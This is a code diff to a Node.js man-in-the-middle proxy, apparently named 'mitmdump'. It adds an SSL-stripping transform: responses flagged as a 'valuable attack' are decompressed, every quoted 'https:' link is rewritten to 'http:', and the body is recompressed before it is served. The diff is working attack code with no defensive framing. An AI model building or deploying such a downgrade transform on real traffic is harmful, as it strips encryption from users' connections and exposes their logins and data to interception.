@@ -4,6 +4,7 @@ const http = require('http')
 const https = require('https')
 const zlib = require('zlib')
 const BufferList = require('bl')
+const { Transform } = require('stream')
 const debug = require('debug')('mitmdump')
 const HttpProxy = require('http-proxy')
 const proxy = HttpProxy.createProxy()
@@ -43,10 +44,27 @@ function isValuable(message, estimated) {
 
 const statusMoved = new Set([301, 302])
 
-const unzip = {
-  gzip    : zlib.createGunzip,
-  deflate : zlib.createInflate
+const compressions = {
+  gzip: {
+    zip: zlib.createGzip,
+    unzip: zlib.createGunzip
+  },
+  deflate: {
+    zip:  zlib.createDeflate,
+    unzip: zlib.createInflate,
+  }
 }
+
+class Https2Http extends Transform {
+  constructor(options) {
+    super(options)
+  }
+  _transform(chunk, encoding, callback) {
+    const replaced = chunk.toString().replace(/(["']\s*)https:/g, '$1http:')
+    callback(null, replaced)
+  }
+}
+
 
 middlewares.push(async function() {
 
@@ -83,25 +101,27 @@ middlewares.push(async function() {
     if (isValuable(message)) {
 
       debug('valuable attack')
-      const origin = new BufferList
-      await buffer(message, origin)
-      const shallow = origin.duplicate()
-      let output = new BufferList
+      result.stream = message
+      const output = new BufferList
       const encoding = message.headers['content-encoding']
+      const replace = new Https2Http
       if (encoding) {
-        const createStream = unzip[encoding.toLowerCase()]
-        if (createStream) {
+        const compression = compressions[encoding.toLowerCase()]
+        if (compression) {
+          debug(`${encoding} stream`)
           await new Promise((resolve) => {
-            const unzipStream = createStream()
-            unzipStream.on('end', resolve)
-            shallow.pipe(unzipStream).pipe(output);
+            const unzip = compression.unzip()
+            unzip.on('end', resolve)
+            message.pipe(unzip).pipe(output);
           })
+          const zip = compression.zip()
+          result.stream = zip
+          output.duplicate().pipe(replace).pipe(zip)
         }
       } else {
-        output = shallow
+        await buffer(message, output)
+        result.stream = output.duplicate().pipe(replace)
       }
-      //console.log(origin.length, output.length);
-      result.stream = origin
       response.body = output.toString()
       headers['x-mitm-valuable'] = true
 
@@ -216,5 +236,5 @@ server.on('upgrade', (request, socket, head) => {
 })
 
 
-server.listen(process.env.PORT, '0.0.0.0')
+server.listen(process.env.PORT)
 module.exports = server
